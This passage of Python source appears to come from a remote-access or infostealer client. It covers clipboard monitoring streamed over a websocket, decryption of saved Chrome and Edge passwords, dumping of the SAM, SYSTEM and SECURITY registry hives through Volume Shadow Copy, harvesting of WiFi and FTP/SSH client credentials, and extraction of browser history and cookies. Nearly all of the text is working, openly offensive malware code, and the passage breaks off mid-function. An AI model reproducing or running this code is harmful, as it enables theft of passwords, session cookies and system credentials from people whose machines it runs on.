        monitoring = True
        
        print(f"[+] Monitoring clipboard... (duration: {duration}s)")
        
        try:
            while monitoring:
                try:
                    # Check if duration exceeded
                    if duration:
                        elapsed = (datetime.now() - start_time).total_seconds()
                        if elapsed >= duration:
                            print("[+] Clipboard monitoring duration completed")
                            break
                    
                    # Read clipboard with timeout
                    import concurrent.futures
                    
                    def read_clipboard():
                        return pyperclip.paste()
                    
                    loop = asyncio.get_event_loop()
                    executor = concurrent.futures.ThreadPoolExecutor(max_workers=1)
                    
                    try:
                        current_content = await asyncio.wait_for(
                            loop.run_in_executor(executor, read_clipboard),
                            timeout=2.0
                        )
                    except asyncio.TimeoutError:
                        await asyncio.sleep(1)
                        continue
                    finally:
                        executor.shutdown(wait=False)
                    
                    # Check if content changed
                    if current_content != last_content and current_content.strip():
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        # Encode content with error handling for non-UTF-8 characters
                        try:
                            # Try UTF-8 encoding first
                            b64_content = base64.b64encode(current_content.encode('utf-8')).decode('utf-8')
                        except (UnicodeEncodeError, UnicodeDecodeError):
                            # If UTF-8 fails, try with error handling
                            try:
                                b64_content = base64.b64encode(current_content.encode('utf-8', errors='replace')).decode('utf-8')
                            except:
                                # Last resort: convert to bytes safely
                                try:
                                    b64_content = base64.b64encode(str(current_content).encode('latin-1', errors='ignore')).decode('utf-8')
                                except:
                                    # Skip this update if encoding fails completely
                                    print(f"[CLIPBOARD] {timestamp} - Encoding error, skipping update")
                                    continue
                        
                        # Store in global history (last 100 entries)
                        clipboard_history.append({
                            'timestamp': timestamp,
                            'content': current_content,
                            'b64_content': b64_content
                        })
                        # Keep only last 100 entries to avoid memory issues
                        if len(clipboard_history) > 100:
                            clipboard_history.pop(0)
                        
                        # Send update to server (for real-time if client is listening)
                        message = f"CLIPBOARD_MONITOR_UPDATE:{timestamp}:{b64_content}"
                        await websocket.send(message)
                        
                        print(f"[CLIPBOARD] {timestamp} - Copied: {current_content[:50]}{'...' if len(current_content) > 50 else ''}")
                        
                        last_content = current_content
                    
                    # Wait before next check
                    await asyncio.sleep(1)
                
                except asyncio.CancelledError:
                    print("[+] Clipboard monitoring cancelled")
                    monitoring = False
                    break
                
                except Exception as e:
                    print(f"[!] Clipboard monitor error: {e}")
                    await asyncio.sleep(1)
        
        finally:
            # Send stop confirmation
            await websocket.send("CLIPBOARD_MONITOR_STOP:Monitoring stopped")
            print("[+] Clipboard monitoring stopped")
        
        return "CLIPBOARD_MONITOR_COMPLETE:Monitoring completed"
    
    except Exception as e:
        return f"CLIPBOARD_MONITOR_ERROR:{str(e)}"

# ============ Browser Password Decryption (v10/v11 with v20 detection) ============
async def decrypt_browser_passwords(browser: str) -> dict:
    """
    Decrypt saved passwords from Edge or Chrome
    Supports v10/v11 encryption, detects v20 app-bound encryption
    browser: 'edge' or 'chrome'
    Returns dict with passwords or error messages
    """
    try:
        import json
        import base64
        import sqlite3
        import shutil
        import tempfile
        import platform
        from pathlib import Path
        
        os_type = platform.system()
        results = {
            'browser': browser,
            'passwords': [],
            'v10_v11_count': 0,
            'v20_count': 0,
            'errors': []
        }
        
        # Check dependencies
        try:
            if os_type == 'Windows':
                import win32crypt
            from Crypto.Cipher import AES
        except ImportError as e:
            return {
                'error': f'Missing required libraries: {str(e)}',
                'note': 'Requires: pywin32 (Windows), pycryptodome'
            }
        
        # Define paths
        if browser == 'edge':
            if os_type == 'Windows':
                local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
                login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
            else:
                return {'error': 'Edge is only available on Windows'}
        else:  # chrome
            if os_type == 'Windows':
                local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
                login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
            elif os_type == 'Linux':
                local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
                login_data_path = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
            elif os_type == 'Darwin':
                local_state_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Local State')
                login_data_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
        
        # Check if files exist
        if not os.path.exists(local_state_path):
            return {'error': f'{browser.title()} not found or not installed', 'path': local_state_path}
        
        if not os.path.exists(login_data_path):
            return {'error': f'Login Data not found', 'path': login_data_path}
        
        # Get encryption key
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            # Check for app-bound encryption (v20)
            has_app_bound = 'app_bound_encrypted_key' in local_state.get('os_crypt', {})
            if has_app_bound:
                results['v20_detected'] = True
                results['v20_note'] = f'{browser.title()} uses App-Bound Encryption (v20) for newer passwords'
            
            # Decrypt key using DPAPI (Windows) or use directly (Linux/Mac)
            if os_type == 'Windows':
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            else:
                key = encrypted_key
            
        except Exception as e:
            return {'error': f'Failed to get encryption key: {str(e)}'}
        
        # Copy Login Data to avoid lock
        temp_db = os.path.join(tempfile.gettempdir(), f'temp_login_{os.getpid()}.db')
        try:
            shutil.copy2(login_data_path, temp_db)
        except Exception as e:
            return {
                'error': f'Cannot access Login Data (browser may be running): {str(e)}',
                'note': f'Close {browser.title()} completely and try again'
            }
        
        # Decrypt passwords
        def decrypt_password(encrypted_password, key):
            try:
                version = encrypted_password[:3]
                
                if version == b'v10' or version == b'v11':
                    # AES-256-GCM decryption for v10/v11
                    nonce = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt(ciphertext)
                    plaintext = plaintext[:-16]  # Remove authentication tag
                    
                    return {
                        'password': plaintext.decode('utf-8'),
                        'version': version.decode(),
                        'decrypted': True
                    }
                    
                elif version == b'v20':
                    # v20 App-Bound Encryption - cannot decrypt
                    return {
                        'password': '[v20 App-Bound - Export Required]',
                        'version': 'v20',
                        'decrypted': False,
                        'note': 'Use edge://settings/passwords to export'
                    }
                    
                else:
                    # Try DPAPI (older method)
                    if os_type == 'Windows':
                        try:
                            plaintext = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                            return {
                                'password': plaintext.decode('utf-8'),
                                'version': 'DPAPI',
                                'decrypted': True
                            }
                        except:
                            pass
                    
                    return {
                        'password': f'[Unknown encryption: {version}]',
                        'version': 'unknown',
                        'decrypted': False
                    }
                    
            except Exception as e:
                return {
                    'password': f'[Decryption failed: {str(e)}]',
                    'version': 'error',
                    'decrypted': False
                }
        
        # Query database
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                if username and encrypted_password:
                    decrypt_result = decrypt_password(encrypted_password, key)
                    
                    results['passwords'].append({
                        'url': url,
                        'username': username,
                        **decrypt_result
                    })
                    
                    # Count by version
                    if decrypt_result.get('decrypted'):
                        results['v10_v11_count'] += 1
                    elif decrypt_result.get('version') == 'v20':
                        results['v20_count'] += 1
            
            conn.close()
            
        except Exception as e:
            results['errors'].append(f'Database error: {str(e)}')
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
        
        results['total'] = len(results['passwords'])
        
        # Add helpful message if v20 passwords found
        if results['v20_count'] > 0:
            results['v20_export_help'] = f"""
To export v20 passwords:
1. Open {browser.title()}
2. Go to: {browser}://settings/passwords
3. Click ⋯ (three dots) next to "Saved passwords"
4. Click "Export passwords"
5. Save as CSV file
"""
        
        return results
        
    except Exception as e:
        return {'error': f'Unexpected error: {str(e)}'}


# ============ Credential Harvesting ============
# ============ Registry Dump via VSS for Credential Extraction ============
async def dump_registry_vss() -> dict:
    """
    Dump SAM, SYSTEM, and SECURITY registry hives via Volume Shadow Copy
    Returns dict with file paths or error messages
    """
    try:
        import subprocess
        import tempfile
        import zipfile
        from datetime import datetime
        import re
        
        results = {
            'method': 'Volume Shadow Copy (VSS)',
            'hives_dumped': [],
            'errors': []
        }
        
        # Ensure downloads directory exists
        ensure_download_dir()
        
        shadow_id = None
        shadow_path = None
        shadow_link = None
        temp_copy_dir = None
        
        try:
            # Step 1: Create Volume Shadow Copy using PowerShell
            print("[VSS] Creating shadow copy for registry dump...")
            
            drive_letter = "C:"
            
            ps_script = f'''
$class = [WMICLASS]"root\\cimv2:win32_shadowcopy";
$result = $class.create("{drive_letter}\\", "ClientAccessible");
if ($result.ReturnValue -eq 0) {{
    $shadowID = $result.ShadowID;
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowID }};
    Write-Output "SHADOW_PATH:$($shadow.DeviceObject)";
    Write-Output "SHADOW_ID:$($shadow.ID)";
}} else {{
    Write-Error "Failed to create shadow copy. Return code: $($result.ReturnValue)";
    exit 1;
}}
'''
            
            vss_create = subprocess.run(
                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if vss_create.returncode != 0:
                raise Exception(f"VSS creation failed: {vss_create.stderr}")
            
            # Parse shadow path and ID
            shadow_match = re.search(r'SHADOW_PATH:(.*)', vss_create.stdout)
            id_match = re.search(r'SHADOW_ID:(.*)', vss_create.stdout)
            
            if not shadow_match:
                raise Exception(f"Could not parse shadow path")
            
            shadow_path = shadow_match.group(1).strip()
            shadow_id = id_match.group(1).strip() if id_match else None
            
            print(f"[VSS] Shadow created: {shadow_path}")
            
            # Step 2: Create symbolic link to shadow
            shadow_link = os.path.join(tempfile.gettempdir(), f'shadow_reg_{os.getpid()}')
            
            mklink_result = subprocess.run(
                ['cmd', '/c', 'mklink', '/D', shadow_link, shadow_path.rstrip('\\')],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if mklink_result.returncode != 0:
                raise Exception(f"Failed to create symbolic link: {mklink_result.stderr}")
            
            print(f"[VSS] Symbolic link created: {shadow_link}")
            
            # Step 3: Copy registry hives from shadow
            temp_copy_dir = os.path.join(tempfile.gettempdir(), f'reg_vss_{os.getpid()}')
            os.makedirs(temp_copy_dir, exist_ok=True)
            
            # Registry hive locations
            hives = {
                'SAM': r'Windows\System32\config\SAM',
                'SYSTEM': r'Windows\System32\config\SYSTEM',
                'SECURITY': r'Windows\System32\config\SECURITY'
            }
            
            copied_hives = []
            
            for hive_name, hive_path in hives.items():
                try:
                    source = os.path.join(shadow_link, hive_path)
                    dest = os.path.join(temp_copy_dir, hive_name)
                    
                    print(f"[VSS] Copying {hive_name} from {source}")
                    
                    # Use copy command
                    copy_result = subprocess.run(
                        ['cmd', '/c', 'copy', source, dest],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    if copy_result.returncode == 0 and os.path.exists(dest):
                        copied_hives.append(hive_name)
                        print(f"[VSS] {hive_name} copied successfully")
                    else:
                        results['errors'].append(f"{hive_name}: Copy failed")
                        
                except Exception as e:
                    results['errors'].append(f"{hive_name}: {str(e)}")
            
            if not copied_hives:
                raise Exception("No registry hives could be copied")
            
            # Step 4: Create ZIP archive
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            zip_filename = f"registry_dump_{timestamp}.zip"
            zip_path = Path(DOWNLOAD_DIR) / zip_filename
            
            print(f"[VSS] Creating ZIP: {zip_path}")
            
            total_size = 0
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for hive_name in copied_hives:
                    hive_file = os.path.join(temp_copy_dir, hive_name)
                    zipf.write(hive_file, hive_name)
                    total_size += os.path.getsize(hive_file)
            
            zip_size = zip_path.stat().st_size
            
            results['success'] = True
            results['zip_file'] = str(zip_path)
            results['filename'] = zip_filename
            results['hives_dumped'] = copied_hives
            results['hive_count'] = len(copied_hives)
            results['original_size_mb'] = round(total_size / (1024 * 1024), 2)
            results['zip_size_mb'] = round(zip_size / (1024 * 1024), 2)
            results['compression_ratio'] = round((1 - zip_size / total_size) * 100, 1) if total_size > 0 else 0
            
            print(f"[VSS] Registry dump complete: {len(copied_hives)} hives, {results['zip_size_mb']} MB")
            
        except Exception as e:
            results['error'] = f'VSS registry dump failed: {str(e)}'
            
        finally:
            # Cleanup
            if shadow_link and os.path.exists(shadow_link):
                try:
                    subprocess.run(['cmd', '/c', 'rmdir', shadow_link], timeout=5)
                except:
                    pass
            
            if shadow_id:
                try:
                    ps_delete = f'(Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq "{shadow_id}" }}).Delete()'
                    subprocess.run(
                        ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_delete],
                        capture_output=True,
                        timeout=10
                    )
                except:
                    pass
            
            if temp_copy_dir and os.path.exists(temp_copy_dir):
                try:
                    import shutil
                    shutil.rmtree(temp_copy_dir)
                except:
                    pass
        
        return results
        
    except Exception as e:
        return {'error': f'Unexpected error: {str(e)}'}


# ============ Credential Harvesting ============
async def harvest_credentials(cred_type: str) -> str:
    """
    Harvest credentials from various sources
    Return format: CREDS_DATA:type:data_json or CREDS_ERROR:message
    """
    try:
        import json
        import subprocess
        import platform
        
        os_type = platform.system()
        results = {}
        
        # ============ WIFI PASSWORDS ============
        if cred_type == "wifi":
            if os_type == 'Windows':
                try:
                    # Get list of WiFi profiles
                    profiles_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profiles'],
                        capture_output=True, text=True, timeout=10
                    )
                    
                    if profiles_result.returncode == 0:
                        wifi_creds = []
                        profiles = []
                        
                        # Parse profile names
                        for line in profiles_result.stdout.split('\n'):
                            if 'All User Profile' in line or 'Profil Tous les utilisateurs' in line:
                                profile = line.split(':')[1].strip()
                                profiles.append(profile)
                        
                        # Get password for each profile
                        for profile in profiles[:20]:  # Limit to 20 profiles
                            try:
                                key_result = subprocess.run(
                                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                    capture_output=True, text=True, timeout=5
                                )
                                
                                if key_result.returncode == 0:
                                    password = None
                                    for line in key_result.stdout.split('\n'):
                                        if 'Key Content' in line or 'Contenu de la clé' in line:
                                            # Use split(':', 1) to preserve colons in password
                                            parts = line.split(':', 1)
                                            if len(parts) > 1:
                                                password = parts[1].strip()
                                            break
                                    
                                    wifi_creds.append({
                                        'ssid': profile,
                                        'password': password if password else '[No password or encrypted]'
                                    })
                            except:
                                continue
                        
                        results['wifi'] = wifi_creds
                        results['wifi_count'] = len(wifi_creds)
                except Exception as e:
                    results['wifi_error'] = str(e)
            
            elif os_type == 'Linux':
                try:
                    # Try to read NetworkManager connections
                    nm_path = '/etc/NetworkManager/system-connections/'
                    wifi_creds = []
                    
                    if os.path.exists(nm_path):
                        for filename in os.listdir(nm_path):
                            try:
                                filepath = os.path.join(nm_path, filename)
                                with open(filepath, 'r') as f:
                                    content = f.read()
                                    ssid = None
                                    password = None
                                    
                                    for line in content.split('\n'):
                                        if line.startswith('ssid='):
                                            ssid = line.split('=')[1]
                                        elif line.startswith('psk='):
                                            password = line.split('=')[1]
                                    
                                    if ssid:
                                        wifi_creds.append({
                                            'ssid': ssid,
                                            'password': password if password else '[Encrypted or no password]'
                                        })
                            except:
                                continue
                    
                    results['wifi'] = wifi_creds
                    results['wifi_count'] = len(wifi_creds)
                except Exception as e:
                    results['wifi_error'] = str(e)
            
            else:  # macOS
                results['wifi_error'] = 'WiFi credential extraction not implemented for macOS'
        
        # ============ BROWSER PASSWORDS ============
        elif cred_type == "browsers":
            results['browsers'] = {}
            
            # Chrome
            try:
                chrome_found = False
                chrome_count = 0
                
                if os_type == 'Windows':
                    chrome_db = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
                elif os_type == 'Linux':
                    chrome_db = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
                elif os_type == 'Darwin':
                    chrome_db = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data')
                
                if os.path.exists(chrome_db):
                    # Count entries (actual decryption requires additional libraries)
                    try:
                        import sqlite3
                        import shutil
                        
                        # Copy DB to temp location
                        temp_db = os.path.join(os.path.dirname(chrome_db), 'temp_login_data')
                        shutil.copy2(chrome_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT COUNT(*) FROM logins')
                        chrome_count = cursor.fetchone()[0]
                        conn.close()
                        
                        os.remove(temp_db)
                        chrome_found = True
                    except:
                        chrome_found = True
                        chrome_count = 'Unknown (DB locked or encrypted)'
                
                results['browsers']['chrome'] = {
                    'found': chrome_found,
                    'count': chrome_count,
                    'location': chrome_db if chrome_found else 'Not found'
                }
            except:
                pass
            
            # Firefox
            try:
                firefox_found = False
                firefox_count = 0
                
                if os_type == 'Windows':
                    firefox_base = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                elif os_type == 'Linux':
                    firefox_base = os.path.expanduser('~/.mozilla/firefox')
                elif os_type == 'Darwin':
                    firefox_base = os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
                
                if os.path.exists(firefox_base):
                    for profile in os.listdir(firefox_base):
                        logins_path = os.path.join(firefox_base, profile, 'logins.json')
                        if os.path.exists(logins_path):
                            try:
                                import json as json_lib
                                with open(logins_path, 'r') as f:
                                    data = json_lib.load(f)
                                    firefox_count += len(data.get('logins', []))
                                firefox_found = True
                            except:
                                firefox_found = True
                                firefox_count = 'Unknown (encrypted)'
                
                results['browsers']['firefox'] = {
                    'found': firefox_found,
                    'count': firefox_count,
                    'location': firefox_base if firefox_found else 'Not found'
                }
            except:
                pass
            
            # Edge
            try:
                edge_found = False
                edge_count = 0
                
                if os_type == 'Windows':
                    edge_db = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
                    
                    if os.path.exists(edge_db):
                        try:
                            import sqlite3
                            import shutil
                            
                            temp_db = os.path.join(os.path.dirname(edge_db), 'temp_edge_login')
                            shutil.copy2(edge_db, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT COUNT(*) FROM logins')
                            edge_count = cursor.fetchone()[0]
                            conn.close()
                            
                            os.remove(temp_db)
                            edge_found = True
                        except:
                            edge_found = True
                            edge_count = 'Unknown (DB locked or encrypted)'
                
                results['browsers']['edge'] = {
                    'found': edge_found,
                    'count': edge_count,
                    'location': edge_db if edge_found else 'Not found'
                }
            except:
                pass
        
        # ============ APPLICATION CREDENTIALS ============
        elif cred_type == "applications":
            results['applications'] = {}
            
            # FileZilla
            try:
                filezilla_found = False
                fz_creds = []
                
                if os_type == 'Windows':
                    fz_xml = os.path.expandvars(r'%APPDATA%\FileZilla\recentservers.xml')
                    fz_xml2 = os.path.expandvars(r'%APPDATA%\FileZilla\sitemanager.xml')
                elif os_type == 'Linux':
                    fz_xml = os.path.expanduser('~/.config/filezilla/recentservers.xml')
                    fz_xml2 = os.path.expanduser('~/.config/filezilla/sitemanager.xml')
                elif os_type == 'Darwin':
                    fz_xml = os.path.expanduser('~/Library/Application Support/FileZilla/recentservers.xml')
                    fz_xml2 = os.path.expanduser('~/Library/Application Support/FileZilla/sitemanager.xml')
                
                for xml_file in [fz_xml, fz_xml2]:
                    if os.path.exists(xml_file):
                        try:
                            with open(xml_file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                # Simple XML parsing (without xml library for portability)
                                if '<Host>' in content and '<User>' in content:
                                    filezilla_found = True
                                    # Count servers
                                    fz_creds.append({
                                        'file': os.path.basename(xml_file),
                                        'note': 'Contains FTP credentials (plaintext in XML)'
                                    })
                        except:
                            pass
                
                results['applications']['filezilla'] = {
                    'found': filezilla_found,
                    'credentials': fz_creds
                }
            except:
                pass
            
            # PuTTY (Windows only)
            if os_type == 'Windows':
                try:
                    putty_found = False
                    putty_sessions = []
                    
                    # PuTTY stores sessions in registry
                    result = subprocess.run(
                        ['reg', 'query', 'HKCU\\Software\\SimonTatham\\PuTTY\\Sessions'],
                        capture_output=True, text=True, timeout=5
                    )
                    
                    if result.returncode == 0:
                        sessions = []
                        for line in result.stdout.split('\n'):
                            if 'Sessions\\' in line:
                                session = line.split('Sessions\\')[1].strip()
                                if session:
                                    sessions.append(session)
                        
                        putty_found = len(sessions) > 0
                        putty_sessions = sessions[:10]  # First 10
                    
                    results['applications']['putty'] = {
                        'found': putty_found,
                        'sessions': putty_sessions,
                        'note': 'Session names found in registry (passwords not stored by PuTTY)'
                    }
                except:
                    pass
            
            # WinSCP (Windows only)
            if os_type == 'Windows':
                try:
                    winscp_found = False
                    winscp_file = os.path.expandvars(r'%APPDATA%\WinSCP.ini')
                    
                    if os.path.exists(winscp_file):
                        winscp_found = True
                    
                    results['applications']['winscp'] = {
                        'found': winscp_found,
                        'location': winscp_file if winscp_found else 'Not found',
                        'note': 'Contains encrypted passwords (can be decrypted with tools)'
                    }
                except:
                    pass
        
        # ============ WINDOWS SAM/LSASS (requires admin) ============
        # ============ EDGE PASSWORD DECRYPTION ============
        elif cred_type == "edge_decrypt":
            if os_type == 'Windows':
                results = await decrypt_browser_passwords('edge')
            else:
                results['error'] = 'Edge password decryption only available on Windows'
        
        # ============ CHROME PASSWORD DECRYPTION ============
        elif cred_type == "chrome_decrypt":
            results = await decrypt_browser_passwords('chrome')
        
        # ============ REGISTRY DUMP VIA VSS ============
        elif cred_type == "registry_dump_vss":
            if os_type == 'Windows':
                results = await dump_registry_vss()
            else:
                results['error'] = 'Registry dump only available on Windows'
        
        # Return results as JSON
        results_json = json.dumps(results, indent=2)
        return f"CREDS_DATA:{cred_type}:{results_json}"
    
    except Exception as e:
        return f"CREDS_ERROR:{str(e)}"

# ============ NEW FEATURE 6: Browser History & Cookies Extraction ============
async def extract_browser_data(data_type: str, save_to_file: bool = False, decrypt_values: bool = False) -> str:
    """
    Extract browser history, cookies, and bookmarks
    data_type: 'history', 'cookies', 'bookmarks', 'downloads'
    save_to_file: if True, saves complete listing to a file in downloads directory
    Return format: BROWSER_DATA:type:data_json or BROWSER_ERROR:message
    """
    try:
        import json
        import platform
        import sqlite3
        import shutil
        import tempfile
        from datetime import datetime
        
        os_type = platform.system()
        results = {}
        
        # Get proper temp directory
        temp_dir = tempfile.gettempdir()
        
        # Ensure downloads directory exists
        ensure_download_dir()
        
        # Variables for file saving
        saved_file_path = None
        total_entries_count = 0
        
        # Define browser database paths
        browser_paths = {}
        
        if os_type == 'Windows':
            browser_paths = {
                'chrome': {
                    'history': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History'),
                    'cookies': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
                    'bookmarks': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks'),
                    'downloads': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
                },
                'edge': {
                    'history': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History'),
                    'cookies': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
                    'bookmarks': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Bookmarks'),
                    'downloads': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History')
                },
                'firefox': {
                    'base': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
                }
            }
        elif os_type == 'Linux':
            browser_paths = {
                'chrome': {
                    'history': os.path.expanduser('~/.config/google-chrome/Default/History'),
                    'cookies': os.path.expanduser('~/.config/google-chrome/Default/Cookies'),
                    'bookmarks': os.path.expanduser('~/.config/google-chrome/Default/Bookmarks'),
                    'downloads': os.path.expanduser('~/.config/google-chrome/Default/History')
                },
                'firefox': {
                    'base': os.path.expanduser('~/.mozilla/firefox')
                }
            }
        elif os_type == 'Darwin':  # macOS
            browser_paths = {
                'chrome': {
                    'history': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History'),
                    'cookies': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies'),
                    'bookmarks': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Bookmarks'),
                    'downloads': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
                },
                'firefox': {
                    'base': os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
                }
            }
        
        # Extract data based on type
        # If decrypt_values is requested for cookies, load the decryption keys
        decryption_keys = {}
        if decrypt_values and data_type == 'cookies' and os_type == 'Windows':
            try:
                import base64
                from Crypto.Cipher import AES
                import win32crypt
                
                print("[DECRYPT] Loading browser encryption keys...")
                
                for browser in ['chrome', 'edge']:
                    try:
                        if browser == 'chrome':
                            local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
                        else:  # edge
                            local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
                        
                        if os.path.exists(local_state_path):
                            with open(local_state_path, 'r', encoding='utf-8') as f:
                                local_state = json.load(f)
                            
                            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
                            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                            decryption_keys[browser] = key
                            print(f"[DECRYPT] Loaded {browser} key")
                    except Exception as e:
                        print(f"[DECRYPT] Failed to load {browser} key: {e}")
                
            except ImportError:
                print("[DECRYPT] Missing libraries (pycryptodome, pywin32) - decryption disabled")
                decrypt_values = False
            except Exception as e:
                print(f"[DECRYPT] Error loading keys: {e}")
                decrypt_values = False
        
        # Extract data based on type
        for browser, paths in browser_paths.items():
            browser_data = []
            
            try:
                if browser == 'firefox':
                    # Firefox uses profiles
                    if 'base' in paths and os.path.exists(paths['base']):
                        for profile in os.listdir(paths['base']):
                            profile_path = os.path.join(paths['base'], profile)
                            if os.path.isdir(profile_path):
                                if data_type == 'history':
                                    db_path = os.path.join(profile_path, 'places.sqlite')
                                elif data_type == 'cookies':
                                    db_path = os.path.join(profile_path, 'cookies.sqlite')
                                elif data_type == 'bookmarks':
                                    db_path = os.path.join(profile_path, 'places.sqlite')
                                else:
                                    continue
                                
                                if os.path.exists(db_path):
                                    temp_db = os.path.join(temp_dir, f'firefox_{data_type}_{os.getpid()}.db')
                                    shutil.copy2(db_path, temp_db)
                                    
                                    try:
                                        conn = sqlite3.connect(temp_db)
                                        cursor = conn.cursor()
                                        
                                        if data_type == 'history':
                                            cursor.execute('''
                                                SELECT url, title, visit_count, last_visit_date 
                                                FROM moz_places 
                                                ORDER BY last_visit_date DESC 
                                                LIMIT 100
                                            ''')
                                            for row in cursor.fetchall():
                                                browser_data.append({
                                                    'url': row[0],
                                                    'title': row[1] if row[1] else 'No title',
                                                    'visit_count': row[2],
                                                    'timestamp': row[3]
                                                })
                                        
                                        elif data_type == 'cookies':
                                            cursor.execute('SELECT host, name, value, expiry FROM moz_cookies LIMIT 100')
                                            for row in cursor.fetchall():
                                                browser_data.append({
                                                    'host': row[0],
                                                    'name': row[1],
                                                    'value': row[2][:50] + '...' if len(row[2]) > 50 else row[2],
                                                    'expiry': row[3]
                                                })
                                        
                                        elif data_type == 'bookmarks':
                                            cursor.execute('''
                                                SELECT url, title 
                                                FROM moz_places 
                                                WHERE id IN (SELECT fk FROM moz_bookmarks WHERE type = 1)
                                                LIMIT 100
                                            ''')
                                            for row in cursor.fetchall():
                                                browser_data.append({
                                                    'url': row[0],
                                                    'title': row[1] if row[1] else 'No title'
                                                })
                                        
                                        conn.close()
                                    finally:
                                        try:
                                            os.remove(temp_db)
                                        except:
                                            pass
                
                else:
                    # Chrome/Edge
                    if data_type in paths:
                        db_path = paths[data_type]
                        
                        if data_type == 'bookmarks':
                            # Bookmarks is a JSON file
                            if os.path.exists(db_path):
                                try:
                                    with open(db_path, 'r', encoding='utf-8') as f:
                                        bookmark_data = json.load(f)
                                        
                                    def extract_bookmarks(node, results=[]):
                                        if 'children' in node:
                                            for child in node['children']:
                                                extract_bookmarks(child, results)
                                        elif 'url' in node:
                                            results.append({
                                                'name': node.get('name', 'No name'),
                                                'url': node['url']
                                            })
                                        return results
                                    
                                    if 'roots' in bookmark_data:
                                        for root_name, root_data in bookmark_data['roots'].items():
                                            browser_data.extend(extract_bookmarks(root_data))
                                except Exception as e:
                                    # Store error for debugging
                                    if browser not in results:
                                        results[browser] = {}
                                    results[browser]['bookmark_error'] = str(e)
                        
                        elif os.path.exists(db_path):
                            # History, Cookies, and Downloads are SQLite databases
                            temp_db = os.path.join(temp_dir, f'{browser}_{data_type}_{os.getpid()}.db')
                            db_copied = False
                            
                            try:
                                # Try to copy the database
                                shutil.copy2(db_path, temp_db)
                                db_copied = True
                            except (PermissionError, OSError) as copy_error:
                                # File is locked - try VSS on Windows
                                if os_type == 'Windows':
                                    try:
                                        print(f"[VSS] Database locked, trying VSS for {browser} {data_type}...")
                                        
                                        import subprocess
                                        import re
                                        
                                        # Get drive letter
                                        drive_letter = os.path.splitdrive(db_path)[0]
                                        
                                        # Create shadow copy
                                        ps_script = f'''
$class = [WMICLASS]"root\\cimv2:win32_shadowcopy";
$result = $class.create("{drive_letter}\\", "ClientAccessible");
if ($result.ReturnValue -eq 0) {{
    $shadowID = $result.ShadowID;
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowID }};
